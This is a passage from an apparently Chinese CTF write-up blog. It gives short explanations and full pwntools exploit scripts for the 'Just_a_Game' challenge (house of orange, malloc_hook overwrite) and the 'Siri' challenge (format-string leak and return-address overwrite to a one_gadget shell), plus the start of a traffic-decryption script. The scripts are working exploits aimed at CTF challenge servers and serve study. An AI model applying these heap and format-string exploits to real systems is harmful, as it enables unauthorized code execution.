class="number">0x23</span>))</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x68</span>)</span><br><span class="line">edit(<span class="number">2</span>,  <span class="string">b&quot;\\x00&quot;</span>*<span class="number">3</span> + p64(<span class="number">0</span>)*<span class="number">2</span> + p64(one_gadget + libc.address) + <span class="string">b&quot;\\n&quot;</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Just-a-Game"><a href="#Just-a-Game" class="headerlink" title="Just_a_Game"></a>Just_a_Game</h3><p><code>edit</code>处存在一个<code>0x8</code>字节的溢出，利用<code>house of orange</code>释放<code>top chunk</code>，泄露<code>libc</code>基址。申请<code>0x1000</code>的堆块的时候又获得了一次edit的机会</p><p><code>case 5</code>处的判断好像没有用，写入<code>__malloc_hook-0x60</code>的地址可以通过，因此利用edit处的数组越界，对<code>malloc_hook</code>进行改写</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">file_path = <span class="string">&quot;./Just_a_Galgame&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">elf = ELF(file_path)</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process([file_path])</span><br><span class="line">    gdb.attach(p, <span class="string">&quot;b *0x04012C2&quot;</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x10a45c</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;123.56.170.202&#x27;</span>, <span class="number">52114</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x10a45c</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;idx &gt;&gt; &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&quot;movie name &gt;&gt; &quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">malloc_big_chunk</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show_all</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shut</span>(<span class="params">content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;5&quot;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&quot;a while? QAQ\\n&quot;</span>, content)</span><br><span class="line"></span><br><span class="line">buf_list = <span class="number">0x404060</span></span><br><span class="line"></span><br><span class="line">add()</span><br><span class="line">edit(<span class="number">0</span>, p64(<span class="number">0</span>)+p64(<span class="number">0xd41</span>))</span><br><span class="line">malloc_big_chunk()</span><br><span class="line">add()</span><br><span class="line">show_all()</span><br><span class="line">p.recvuntil(<span class="string">&quot;1: &quot;</span>)</span><br><span class="line">libc.address = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\\x00&quot;</span>)) - <span class="number">0x660</span> - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] - <span class="number">0x10</span></span><br><span class="line">log.success(<span class="string">&quot;libc address &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc.address)))</span><br><span class="line"></span><br><span class="line">shut(p64(libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] - <span class="number">0x60</span>))</span><br><span class="line"></span><br><span class="line">index = <span class="built_in">int</span>((<span class="number">0x4040A0</span>-<span class="number">0x404060</span>)/<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">edit(index, p64(one_gadget + libc.address))</span><br><span class="line"></span><br><span class="line">add()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Siri"><a href="#Siri" class="headerlink" title="Siri"></a>Siri</h3><p>这题目难顶，一开始写返回地址用的是<code>rop</code>链，调<code>system</code>，发现<code>rsi</code>控制不了，字符串超了。之后改用<code>gadget</code>，眼睁睁看着进了<code>system</code>，<code>execve</code>感觉也没啥问题，难顶，最后队友搞出来了。</p><p>后面填坑</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">file_path = <span class="string">&quot;./Siri&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"><span class="comment"># context.log_level = &quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">elf = ELF(file_path)</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process([file_path], env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&quot;./libc.so.6&quot;</span>&#125;)</span><br><span class="line">    gdb.attach(p, <span class="string">&#x27;b *0x5555555552B1\\nb *0x555555555417&#x27;</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x10a45c</span></span><br><span class="line">    p_rdi_r = <span class="number">0x10a45c</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;123.56.170.202&#x27;</span>, <span class="number">12124</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x10a45c</span></span><br><span class="line">    p_rdi_r = <span class="number">0x10a45c</span></span><br><span class="line"></span><br><span class="line">str_head = <span class="string">&quot;Remind me to &quot;</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>, <span class="string">&quot;Hey Siri!&quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;%80$p %81$p %82$p %83$p&quot;</span></span><br><span class="line"><span class="comment"># payload = &quot;%08x &quot;*0x10</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>, str_head + payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;remind you to &quot;</span>)</span><br><span class="line">stack_address = <span class="built_in">int</span>(p.recvuntil(<span class="string">&quot; &quot;</span>, drop=<span class="literal">True</span>), <span class="number">16</span>) - <span class="number">0x1b0</span></span><br><span class="line">canary = <span class="built_in">int</span>(p.recvuntil(<span class="string">&quot; &quot;</span>, drop=<span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line">elf.address = <span class="built_in">int</span>(p.recvuntil(<span class="string">&quot; &quot;</span>, drop=<span class="literal">True</span>), <span class="number">16</span>) - <span class="number">0x14d0</span></span><br><span class="line">libc.address = <span class="built_in">int</span>(p.recvline().strip(<span class="string">b&quot;\\n&quot;</span>), <span class="number">16</span>) - <span class="number">231</span> - libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">strncmp_got = elf.got[<span class="string">&#x27;strncmp&#x27;</span>]</span><br><span class="line">system_address = libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&quot;strncmp address &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(strncmp_got)))</span><br><span class="line">log.success(<span class="string">&quot;system address &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(system_address)))</span><br><span class="line">binsh_address = libc.search(<span class="string">b&quot;/bin/sh&quot;</span>).__next__()</span><br><span class="line">p_rdi_r += libc.address</span><br><span class="line">one_gadget += libc.address</span><br><span class="line">log.success(<span class="string">&quot;r rdi ret &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(p_rdi_r)))</span><br><span class="line">log.success(<span class="string">&quot;one gadget &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(one_gadget)))</span><br><span class="line"></span><br><span class="line">payload = str_head</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x7ffff7a373c2</span></span><br><span class="line">payload += <span class="string">&quot;%&#123;&#125;c%57$hn&quot;</span>.<span class="built_in">format</span>(<span class="number">0xffff</span> &amp; ((one_gadget &amp; <span class="number">0xffff</span>) - <span class="number">27</span>))</span><br><span class="line">payload += <span class="string">&quot;%&#123;&#125;c%58$hn&quot;</span>.<span class="built_in">format</span>(<span class="number">0xffff</span> &amp; (((one_gadget &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xffff</span>) - (one_gadget &amp; <span class="number">0xffff</span>)))</span><br><span class="line">payload += <span class="string">&quot;%&#123;&#125;c%59$hn&quot;</span>.<span class="built_in">format</span>(<span class="number">0xffff</span> &amp; (((one_gadget &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xffff</span>) - (one_gadget &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xffff</span>))</span><br><span class="line">payload += <span class="string">&quot;%&#123;&#125;c%60$hn&quot;</span>.<span class="built_in">format</span>(<span class="number">0xffff</span> &amp; (((one_gadget &gt;&gt; <span class="number">48</span>) &amp; <span class="number">0xffff</span>) - (one_gadget &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xffff</span>))</span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">0x48</span>, <span class="string">&quot;a&quot;</span>).encode()</span><br><span class="line"></span><br><span class="line">payload += p64(stack_address + <span class="number">0x8</span>)</span><br><span class="line">payload += p64(stack_address + <span class="number">0x8</span> + <span class="number">2</span>)</span><br><span class="line">payload += p64(stack_address + <span class="number">0x8</span> + <span class="number">4</span>)</span><br><span class="line">payload += p64(stack_address + <span class="number">0x8</span> + <span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># # 0x7ffff7a3752b</span></span><br><span class="line"><span class="comment"># payload += &quot;%&#123;&#125;c%78$n&quot;.format((system_address &gt;&gt; 32 &amp; 0xffff) - 27)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># payload += &quot;%&#123;&#125;c%68$hn&quot;.format(0xffff &amp; ((p_rdi_r &amp; 0xffff) - (system_address &gt;&gt; 32 &amp; 0xffff) ))</span></span><br><span class="line"><span class="comment"># payload += &quot;%&#123;&#125;c%69$hn&quot;.format(0xffff &amp; (((p_rdi_r &gt;&gt; 16) &amp; 0xffff) - (p_rdi_r &amp; 0xffff)))</span></span><br><span class="line"><span class="comment"># payload += &quot;%&#123;&#125;c%70$hn&quot;.format(0xffff &amp; (((p_rdi_r &gt;&gt; 32) &amp; 0xffff) - (p_rdi_r &gt;&gt; 16) &amp; 0xffff))</span></span><br><span class="line"><span class="comment"># payload += &quot;%&#123;&#125;c%71$hn&quot;.format(0xffff &amp; (((p_rdi_r &gt;&gt; 48) &amp; 0xffff) - (p_rdi_r &gt;&gt; 32) &amp; 0xffff))</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># # 0x7ffff7b990be</span></span><br><span class="line"><span class="comment"># payload += &quot;%&#123;&#125;c%72$hn&quot;.format(0xffff &amp; (binsh_address &amp; 0xffff) - (p_rdi_r &gt;&gt; 48) &amp; 0xffff)</span></span><br><span class="line"><span class="comment"># payload += &quot;%&#123;&#125;c%73$hn&quot;.format(0xffff &amp; ((binsh_address &gt;&gt; 16) &amp; 0xffff) - (binsh_address &amp; 0xffff))</span></span><br><span class="line"><span class="comment"># payload += &quot;%&#123;&#125;c%74$hn&quot;.format(0xffff &amp; (((binsh_address &gt;&gt; 32) &amp; 0xffff) - ((binsh_address &gt;&gt; 16) &amp; 0xffff)))</span></span><br><span class="line"><span class="comment"># payload += &quot;%&#123;&#125;c%75$hn&quot;.format(0xffff &amp; (((binsh_address &gt;&gt; 48) &amp; 0xffff) - ((binsh_address &gt;&gt; 32) &amp; 0xffff)))</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># # 0x7ffff7a74c67</span></span><br><span class="line"><span class="comment"># payload += &quot;%&#123;&#125;c%76$hn&quot;.format(0xffff &amp; ((system_address &amp; 0xffff) - (binsh_address &gt;&gt; 48) &amp; 0xffff))</span></span><br><span class="line"><span class="comment"># payload += &quot;%&#123;&#125;c%77$hn&quot;.format(0xffff &amp; (((system_address &gt;&gt; 16) &amp; 0xffff) - (system_address &amp; 0xffff)))</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># payload = payload.ljust(0xa0, &quot;a&quot;).encode()</span></span><br><span class="line"><span class="comment"># payload += p64(stack_address + 0x8)</span></span><br><span class="line"><span class="comment"># payload += p64(stack_address + 0x8 + 2)</span></span><br><span class="line"><span class="comment"># payload += p64(stack_address + 0x8 + 4)</span></span><br><span class="line"><span class="comment"># payload += p64(stack_address + 0x8 + 6)</span></span><br><span class="line"><span class="comment"># payload += p64(stack_address + 0x10)</span></span><br><span class="line"><span class="comment"># payload += p64(stack_address + 0x10 + 2)</span></span><br><span class="line"><span class="comment"># payload += p64(stack_address + 0x10 + 4)</span></span><br><span class="line"><span class="comment"># payload += p64(stack_address + 0x10 + 6)</span></span><br><span class="line"><span class="comment"># payload += p64(stack_address + 0x18)</span></span><br><span class="line"><span class="comment"># payload += p64(stack_address + 0x18 + 2)</span></span><br><span class="line"><span class="comment"># payload += p64(stack_address + 0x18 + 4)</span></span><br><span class="line"><span class="comment"># payload = payload.ljust(0x100, b&quot;\\x00&quot;)</span></span><br><span class="line"><span class="comment"># payload = &quot;%08x &quot;*0x10</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>, <span class="string">&quot;Hey Siri!&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>, payload)</span><br><span class="line">log.success(<span class="string">&quot;system address &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(system_address)))</span><br><span class="line">log.success(<span class="string">&quot;bin sh address &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(binsh_address)))</span><br><span class="line">log.success(<span class="string">&quot;stack address &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(stack_address)))</span><br><span class="line">log.success(<span class="string">&quot;binary base &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(elf.address)))</span><br><span class="line">log.success(<span class="string">&quot;canary &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(canary)))</span><br><span class="line">log.success(<span class="string">&quot;libc address &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc.address)))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="红方辅助"><a href="#红方辅助" class="headerlink" title="红方辅助"></a>红方辅助</h3><p>从客户端来看首先是发送的<code>G</code>，然后服务端返回<code>btime</code>，客户端对数据进行加密之后发送<code>boffset</code>，<code>enc_data</code>。</p><p>加密函数中随机产生的数据，如<code>fn,salt</code>都包含在加密数据的起始位置，如果可以得到这些随机数据既可以对数据流进行解密</p><p>题目给出了与服务端进行通信的数据流，使用<code>Wireshark</code>的<code>TCP</code>流追踪得到完整的通信过程，但是最后一次的通信缺少<code>pcount</code>，自行添加即可</p><p>解密之后的数据可以通过<code>sublime</code>缩略图看，不然<code>e,8</code>分不清</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5, sha256</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_salt</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>((md5(sha256(data.encode()).digest())).hexdigest(), <span class="number">16</span>) % <span class="number">256</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_bytes</span>(<span class="params">data</span>):</span><br><span class="line">    length = <span class="built_in">len</span>(data)</span><br><span class="line">    new_data = <span class="string">b&quot;&quot;</span></span><br><span class="line">    index = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> index &lt; length:</span><br><span class="line">        new_data += p8(<span class="built_in">int</span>(data[index:index + <span class="number">2</span>], <span class="number">16</span>))</span><br><span class="line">        index += <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> new_data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">data, btime, count</span>):</span><br><span class="line">    funcs = &#123;</span><br><span class="line">        <span class="string">&quot;0&quot;</span>: <span class="keyword">lambda</span> x, y: x - y,</span><br><span class="line">        <span class="string">&quot;1&quot;</span>: <span class="keyword">lambda</span> x, y: x + y,</span><br><span class="line">        <span class="string">&quot;2&quot;</span>: <span class="keyword">lambda</span> x, y: x ^ y</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    offset = &#123;</span><br><span class="line">        <span class="string">&quot;0&quot;</span>: <span class="number">0xefffff</span>,</span><br><span class="line">        <span class="string">&quot;1&quot;</span>: <span class="number">0xefffff</span>,</span><br><span class="line">        <span class="string">&quot;2&quot;</span>: <span class="number">0xffffff</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    length = <span class="built_in">len</span>(data) + <span class="number">10</span></span><br><span class="line">    fn = <span class="built_in">str</span>(random.randint(<span class="number">0</span>, <span class="number">65535</span>) % <span class="number">3</span>).encode()</span><br><span class="line">    salt = get_salt(data)</span><br><span class="line"></span><br><span class="line">    t = struct.unpack(<span class="string">&quot;&lt;i&quot;</span>, btime)[<span class="number">0</span>]</span><br><span class="line">    boffset = offset[fn.decode()]</span><br><span class="line">    t -= boffset</span><br><span class="line">    t = struct.pack(<span class="string">&quot;&lt;i&quot;</span>, t)</span><br><span class="line"></span><br><span class="line">    enc = struct.pack(<span class="string">&quot;&lt;IIcB&quot;</span>, count, length, fn, salt)</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> data:</span><br><span class="line">        enc += <span class="built_in">chr</span>((funcs[fn.decode()](<span class="built_in">ord</span>(c) ^ <span class="built_in">ord</span>(t[i]), salt) % <span class="number">256</span>))</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">4</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> boffset, enc</span><br><span class="line"></span><br><span class="line">fn_di = [<span class="string">&quot;001&quot;</span>,</span><br><span class="line">         <span class="string">&quot;011&quot;</span>,</span><br><span class="line">         <span class="string">&quot;111&quot;</span>,</span><br><span class="line">         <span class="string">&quot;010&quot;</span>,</span><br><span class="line">         <span class="string">&quot;100&quot;</span>,</span><br><span class="line">         <span class="string">&quot;110&quot;</span>,</span><br><span class="line">         <span class="string">&quot;000&quot;</span>,</span><br><span class="line">         <span class="string">&quot;111&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">btime, boffset, data, pcount</span>):</span><br><span class="line">    funcs = &#123;</span><br><span class="line">        <span class="string">b&quot;0&quot;</span>: <span class="keyword">lambda</span> x, y: x + y,</span><br><span class="line">        <span class="string">b&quot;1&quot;</span>: <span class="keyword">lambda</span> x, y: x - y,</span><br><span class="line">        <span class="string">b&quot;2&quot;</span>: <span class="keyword">lambda</span> x, y: x ^ y</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    offset = &#123;</span><br><span class="line">        <span class="string">&quot;0&quot;</span>: <span class="number">0xefffff</span>,</span><br><span class="line">        <span class="string">&quot;1&quot;</span>: <span class="number">0xefffff</span>,</span><br><span class="line">        <span class="string">&quot;2&quot;</span>: <span class="number">0xffffff</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    length = <span class="built_in">len</span>(data) - <span class="number">10</span></span><br><span class="line">    t = btime - boffset</span><br><span class="line">    t = struct.pack(<span class="string">&quot;&lt;i&quot;</span>, t)</span><br><span class="line">    count, length, fn, salt = struct.unpack(<span class="string">&quot;&lt;IIcB&quot;</span>, data[:<span class="number">10</span>])</span><br><span class="line">    <span class="comment"># print(count, hex(length), fn, salt, t)</span></span><br><span class="line">    res = <span class="string">&quot;&quot;</span></span><br><span class="line">    data = data[<span class="number">10</span>:]</span><br><span class="line">    <span class="comment"># print(data)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> index, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(data):</span><br><span class="line">        res += <span class="built_in">chr</span>((funcs[fn](c, salt) % <span class="number">256</span>) ^ t[index % <span class="number">4</span>])</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">big_small_end_convert</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">return</span> binascii.hexlify(binascii.unhexlify(data)[::-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">total_decrypt</span>():</span><br><span class="line">    res = <span class="built_in">dict</span>()</span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&quot;./encdata.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>)</span><br><span class="line">    rf = <span class="built_in">open</span>(<span class="string">&quot;./dedata.txt&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line">    readlines = f.readlines()</span><br><span class="line">    f.close()</span><br><span class="line">    lines_num = <span class="built_in">len</span>(readlines)</span><br><span class="line">    index = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> index &lt; lines_num:</span><br><span class="line">        btime = struct.unpack(<span class="string">&quot;&lt;i&quot;</span>, get_bytes(readlines[index + <span class="number">1</span>].strip(<span class="string">b&quot;\\r\\n&quot;</span>)))[<span class="number">0</span>]</span><br><span class="line">        boffset = struct.unpack(<span class="string">&quot;&lt;i&quot;</span>, get_bytes(readlines[index 